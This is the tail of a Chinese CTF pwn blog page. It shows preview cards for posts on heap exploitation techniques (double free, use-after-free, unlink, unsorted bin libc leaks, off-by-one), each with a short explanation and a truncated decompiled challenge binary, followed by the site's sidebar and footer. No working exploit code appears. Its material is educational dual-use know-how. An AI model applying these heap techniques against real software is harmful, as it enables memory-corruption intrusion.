class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">Double_free</div></div><div class="info-2"><div class="info-item-1">Double Free顾名思义就是进行两次free的操作。不过为什么要进行两次的free呢？ 因为通过这样的手法就可以实现任意地址写。 [HGAME 2023 week2]new_fast_note12345678910111213141516171819202122232425262728293031323334353637int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+14h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  init(argc, argv, envp);  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;n4);    if ( n4 == 4 )      exit(0);    if ...</div></div></div></a><a class="pagination-related" href="/2026/02/19/UAF/" title="UAF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">UAF</div></div><div class="info-2"><div class="info-item-1">UAFUse After Free：即free后再次进行利用。Dangling Pointer（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。 [NISACTF 2022]UAF[NISACTF 2022]UAF | NSSCTF 123456789101112131415161718192021222324252627282930313233343536373839404142434445int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  _DWORD v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    wh...</div></div></div></a><a class="pagination-related" href="/2026/02/19/Unlink-attack/" title="Unlink_attack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">Unlink_attack</div></div><div class="info-2"><div class="info-item-1">Unlink attackunlink，俗称拖链，将unsorted_bin中的处于free状态的堆块脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块（可以是向前合并或者向后合并），合并完之后再放入unsorted_bin中。 一般产生漏洞的原因是通过off-by-null，off-by-one，堆溢出，修改了堆块的p标志位。 [SUCTF 2018 招新赛]unlink1234567891011121314151617181920212223242526272829303132333435int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-8h]  v5 = __readfsqword(0x28u);  init(argc, argv, envp);  puts(&quot;welcome to note system&quo...</div></div></div></a><a class="pagination-related" href="/2026/02/19/Unsorted-bin-attack/" title="Unsorted_bin_attack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">Unsorted_bin_attack</div></div><div class="info-2"><div class="info-item-1">Unsorted bin attack说是unsorted bin attack，在这里其实只是一个借助unsorted bin 来泄露libc的一种手段。 unsorted bin是一个双向链表，具体可以用下面这张图来演示。  所以，如果当我们能访问到尾节点的时候，就可以打印出尾节点的fd，指向的就是main_arena的地址，从而泄露出libc的基地址。 [HNCTF 2022 WEEK4]ez_uaf123456789101112131415161718192021222324252627282930313233343536373839404142int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+Ch] [rbp-4h]  init_env(argc, argv, envp);  puts(&quot;Easy Note.&quot;);  while ( 1 )  &#123;    while ( 1 )    &#1...</div></div></div></a><a class="pagination-related" href="/2026/02/19/off-by-one/" title="off_by_one"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">off_by_one</div></div><div class="info-2"><div class="info-item-1">off-by-oneoff-by-one是指单字节缓冲区溢出其实不仅在堆里出现，在栈上也是一种可以利用的漏洞。不过在这里就仅仅考虑在堆上的利用。 1.[HNCTF 2022 WEEK4] EZheap[HNCTF 2022 WEEK4]ezheap | NSSCTF 123456789101112131415161718192021222324252627282930313233343536373839404142int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+Ch] [rbp-4h]  init_env(argc, argv, envp);  puts(&quot;Easy Note.&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      n4 = getnum();      if ( n4 != 4 )        break; ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/23/off-by-null/" title="off_by_null">off_by_null</a><time datetime="2026-02-23T15:22:08.000Z" title="发表于 2026-02-23 23:22:08">2026-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Unlink-attack/" title="Unlink_attack">Unlink_attack</a><time datetime="2026-02-19T14:27:22.000Z" title="发表于 2026-02-19 22:27:22">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Double-free/" title="Double_free">Double_free</a><time datetime="2026-02-19T14:26:27.000Z" title="发表于 2026-02-19 22:26:27">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Unsorted-bin-attack/" title="Unsorted_bin_attack">Unsorted_bin_attack</a><time datetime="2026-02-19T14:24:57.000Z" title="发表于 2026-02-19 22:24:57">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/off-by-one/" title="off_by_one">off_by_one</a><time datetime="2026-02-19T14:23:51.000Z" title="发表于 2026-02-19 22:23:51">2026-02-19</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">7</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">10</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a> <a href="/tags/pwn/" style="font-size: 1.1em; color: #999">pwn</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.3em; color: #99a1ac">pwn进阶</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.5em; color: #99a9bf">pwn入门</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">7</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">6</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">18</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-02-23T16:35:47.148Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
